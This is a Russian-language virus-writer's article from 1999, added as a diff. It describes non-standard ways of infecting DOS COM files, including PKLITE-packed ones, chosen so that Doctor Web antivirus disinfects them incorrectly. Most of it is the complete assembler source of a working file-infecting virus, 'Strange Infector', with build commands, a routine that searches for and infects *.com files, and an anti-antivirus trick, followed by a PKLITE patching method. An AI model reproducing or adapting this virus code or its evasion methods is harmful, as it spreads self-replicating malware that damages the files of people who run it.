@@ -1,0 +1,297 @@
+─[NOT-STANDART COM-FILES INFECTION METHODS]─────────────────────────[JD & MNG]─
+
+
+   вступление
+
+    Все идеи описаные в этой статье принадлежат Джону Дарланду, который  поле-
+ нился написать статью и простенький вирус для иллюстрации, поэтому все  приш-
+ лось делать мне (mongoose).
+
+
+   нафиг вообще нужна эта статья?
+
+    "Вирусу абсолютно все равно, откуда его запустили. В любом случае он будет
+ восстанавливать первые  байты. В  pklite'нутых   файлах после лечения вначале
+ оказывается pop dx/retf. Веб берет  и тупо копирует данные  лечения  вначало.
+ Т.е. в начале  "вылеченого" файла оказывается pop dx/retf. ;) Но  вызывали-то
+ вирус не оттуда!  :)))" - John Darland
+
+    Но это все справедливо если использовать в вирусе стандартный метод  зара-
+ жения com-файлов, а  для pklite'нутых использовать ниже  описаный метод. Тоже
+ касается и нестандартных методов заражения com-файлов, их нужно комбинировать
+ с простым методом, можно заражать файлы по рандому (простым или нестандартным
+ (если конечно файл подходит для заражения нестандартным методом).
+
+    Т.е. в этой статье описаны методы которые "играют" на особенности  лечения
+ зараженых файлов доктором вебом.
+
+
+   нестандартное заражение обычных COM-файлов
+
+    Обычно COM-файлы заражают стандартным (в начале переход на себя и  тело  в
+ конце, середине, области повторяющихся байт...), перемещения (а/ля Jerusalem)
+ и hll способом. Нет, речь пойдет не о симбиозе...
+
+    Почти все COM-файлы содержат в начале инструкцию:
+
+  cs:100h       jmp      offset ????            ; E9,??,??
+
+    В конец, середину, область повторяющих байт и тд записываем тело вируса, а
+ в начало файла записываем инструкции:
+
+  cs:100h       push     offset ????+100h       ; 68,??,??
+  cs:103h       jmp      real_start             ; Передаем управление вирусу
+
+    Но запоминаем  только три байта с позиции 103h, потом востанавливаем их на
+ 103h, для передачи управления жертве просто выполняем ret
+
+    Приведу второй пример, если в начале COM-файла инструкция типа:
+
+  cs:100h       mov      [16 битный регистр],????
+
+    Все тоже самое но только в начало записываем инструкции:
+
+  cs:100h       push     ????                   ; 68,??,??
+  cs:103h       jmp      real_start             ; Передаем управление вирусу
+
+    Востанавиливаем три байта на 103h, для передачи выполнения выполняем:
+
+                pop      [16 битный регистр]
+                push     103h
+                ret
+
+    А теперь иллюстрация к статье - примитивный  вирус Strange Infector (зара-
+ жает файлы только не стандартным методом), компилить: tasm si.asm
+                                                       tlink /t /x si.obj
+────[SI.ASM]─────────[START]───────────────────────────────────────────────────
+; SI.328 - Strange Infector
+;
+;                              (с) mongoose, Misdirected Youth. September `99
+               .model   tiny
+               .code
+                org     100h
+
+ start: push_xxxx        db 68h,00h,4ch         ; Infected by second method
+                jmp      real_start
+                         db 11h
+ programm                db 993 dup (90h)
+
+ real_start:    push     es ds                  ; Anti Web v4.11 (?) trick
+                cmp      word ptr ds:[16h],0
+                jnz      no_web
+                jmp      cure_data
+
+ no_web:        call     calculate_ip           ; Calculate IP
+                sub      bp,offset no_web+3
+                pop      ds es
+
+ restore:       mov      di,103h                ; Restore first 5 bytes
+                lea      si,[bp+orig_bytes]
+                movsw
+                movsw
+
+                lea      dx,[bp+dta]            ; Set new DTA
+                call     set_dta
+
+                mov      ah,4eh                 ; Find first COM-file
+                sub      cx,cx                  ; Attributes
+                lea      dx,[bp+com_mask]       ; Com-files mask
+ try_another:   int      21h
+                jnc      open_file              ; Jump if files not found
+                jmp      quit
+
+ open_file:     mov      ax,3d02h               ; Open file for Read'n'write
+                lea      dx,[bp+dta+1eh]        ; File name
+                int      21h
+                xchg     bx,ax                  ; Save file handle in bx
+
+                mov      ax,4200h
+                sub      cx,cx
+                mov      dx,3
+                int      21h
+
+                mov      ah,3fh                 ; Read first 5 bytes
+                mov      cx,4
+                lea      dx,[bp+orig_bytes]
+                int      21h
+
+                mov      ax,word ptr [bp+dta+1ah]
+                cmp      ax,1000
+                ja       check_if_big
+                jmp      close
+
+ check_if_big:  cmp      ax,60000
+                jb       check_if_ill
+                jmp      close
+
+ check_if_ill:  cmp      byte ptr [bp+orig_bytes+3],11h
+                jnz      check_exe
+                jmp      close
+
+ check_exe:     cmp      byte ptr [bp+orig_bytes+1],'Z'
+                jnz      move_to_start
+                jmp      close
+
+ move_to_start: sub      ax,ax
+                call     move_ptr
+
+                mov      ah,3fh                 ; Read first 3 bytes
+                mov      cx,3
+                lea      dx,[bp+buffer]
+                int      21h
+
+                lea      di,[bp+xor_buffer]     ; Move virus body to buffer
+                lea      si,[bp+real_start]
+                mov      cx,(end_of_code-real_start)
+                cld
+                rep      movsb
+
+ chk_second:    mov      al,0b8h                ; First instruction must be
+ cmp_buff:      cmp      byte ptr [bp+buffer],al; MOV REG,XXXX or
+                jz       second_method
+                inc      al
+                cmp      al,0c0h
+                jnz      cmp_buff
+
+ chk_first:     cmp      byte ptr [bp+buffer],0e9h
+                jnz      close
+
+ first_method:  mov      byte ptr [bp+writebuffer],68h
+                mov      ax,word ptr [bp+buffer+1]
+                add      ax,100h
+                mov      word ptr [bp+writebuffer+1],ax
+
+                mov      ax,0c390h
+                jmp      write_it
+
+ second_method: mov      byte ptr [bp+writebuffer],68h
+                mov      ax,word ptr [bp+buffer+1]
+                mov      word ptr [bp+writebuffer+1],ax
+
+                mov      ah,byte ptr [bp+buffer]; Move POP REG to buffer
+                sub      ah,60h
+                mov      al,90h
+ write_it:      lea      si,[bp+xor_buffer]
+                add      si,(cure_data-real_start)
+                mov      word ptr [si],ax
+
+                mov      ax,word ptr [bp+dta+1ah]
+                sub      al,6
+                mov      byte ptr [bp+writebuffer+3],0e9h
+                mov      word ptr [bp+writebuffer+4],ax
+                mov      byte ptr [bp+writebuffer+6],11h
+ 
+                sub      ax,ax
+                call     move_ptr
+
+                mov      ah,40h
+                mov      cl,7
+                lea      dx,[bp+writebuffer]
+                int      21h
+
+                mov      al,2
+                call     move_ptr
+
+                mov      ah,40h                 ; Write virii body to file
+                mov      cx,(end_of_code-real_start)
+                lea      dx,[bp+xor_buffer]
+                int      21h
+
+ close:         mov      ah,3eh                 ; Close infected file
+                int      21h
+
+                mov      ah,4fh                 ; Find next file
+                jmp      try_another
+ quit:          mov      dx,80h                 ; Restore old DTA
+                call     set_dta
+          
+ cure_data:     pop      ax
+                nop
+ push_103h               db 68h,03h,01h,0c3h    ; Jump to CS:103
+                         db 'MY'                ; means Misdirected Youth
+;┌─────────────────────────────────────────────────────────────────────────────
+;│ PROCEDURES
+;└─────────────────────────────────────────────────────────────────────────────
+ set_dta:       mov      ah,1ah                 ; Set DTA
+                int      21h
+                ret 
+;──────────────────────────────────────────────────────────────────────────────
+ move_ptr:      mov      ah,42h                 ; Move file ptr
+                sub      cx,cx
+                cwd
+                int      21h
+                ret
+;──────────────────────────────────────────────────────────────────────────────
+ calculate_ip:  pop      bp                     ; Calculate IP and fuck TBAV
+                push     bp                     ; with doctor WEB
+                ret
+;┌─────────────────────────────────────────────────────────────────────────────
+;│ DATA
+;└─────────────────────────────────────────────────────────────────────────────
+ com_mask                db '*.com', 0          ; File mask
+ orig_bytes              db 0cdh,21h,90h,90h    ; To save original bytes
+;┌─────────────────────────────────────────────────────────────────────────────
+;│ HEAP
+;└─────────────────────────────────────────────────────────────────────────────
+ end_of_code    label    byte
+ writebuffer             db 7 dup (?)
+ dta                     db 42 dup (?)
+ buffer                  db 3 dup (?)
+ xor_buffer              db (end_of_code-real_start) dup (?)
+
+                end    start
+────[SI.ASM]─────────[END]─────────────────────────────────────────────────────
+
+
+   нестандартное заражение COM-файлов упакованых PKLITE
+
+    com-файл упакованный pklite до заражения:
+
+────[PKLITE.LST]─────[START]───────────────────────────────────────────────────
+0100▐ 50                    PUSH    AX
+0101▐ B8 88 27              MOV     AX,2788
+0104▐ BA 78 00              MOV     DX,0078
+0107▐ 3B C4                 CMP     AX,SP
+0109▐ 73 79                 JNC     0184
+010B▐ 8B C4                 MOV     AX,SP
+010D▐ 2D 42 03              SUB     AX,0342
+0110▐ 25 F0 FF              AND     AX,FFF0
+0113▐ 8B F8                 MOV     DI,AX
+0115▐ B9 A1 00              MOV     CX,00A1
+0118▐ BE 8E 01              MOV     SI,018E
+011B▐ FC                    CLD
+011C▐ F3/A5                 REP     MOVSW
+011E▐ 8B D8                 MOV     BX,AX
+0120▐ B1 04                 MOV     CL,04
+0122▐ D3 EB                 SHR     BX,CL
+0124▐ 8C D9                 MOV     CX,DS
+0126▐ 03 D9                 ADD     BX,CX
+0128▐ 53                    PUSH    BX
+0129▐ 33 DB                 XOR     BX,BX
+012B▐ 53                    PUSH    BX
+012C▐ CB                    RETF                          ; Ret far
+012D▐ 90                    NOP
+012E▐ 32 01                 XOR     AL,Byte ptr [BX+DI]
+0130▐ 50                            DB 'P'                ; PKLITE copyright
+────[PKLITE.LST]─────[EOF]─────────────────────────────────────────────────────
+
+    Три байта по смещению 12Bh нам не нужны (так же как и копирайт pklitа) по-
+ этому на их место пишем jmp на 130h (затираем комманды push bx/retf). По сме-
+ щению 130h расположен  копирайт PKLITE который  мы затираем инструкциями push
+ bx, push dx (так как распаковщику pklite нужно значение dx).  При лечении ви-
+ рус пишет pop dx/retf по смещению 100h и  передает упраление на них. Т.е. ви-
+ русу абсолютно все равно, откуда его вызвали...
+
+    Такой метод заражения pklit'нутых файлов используется в нескольких послед-
+ них версиях doctor'а web'а, в вирлисте Данилов сообщает что файлы  зараженные
+ таким способом лечатся некоректно:
+
+────[VIRLIST.DWB]────[START]───────────────────────────────────────────────────
+        JDC.6891, 7474, 7616 при заражении файлов, упакованных PKLITE, внедряют
+        фрагменты  своего  кода  в середину распаковщика. Лечение  таких файлов
+        будет некорректным.
+────[VIRLIST.DWB]────[EOF]─────────────────────────────────────────────────────
+
+                                                       ideas by John Darland/MY
+                                                  code & article by mongoose/MY
+                                           (c) by soldiers of Misdirected Youth
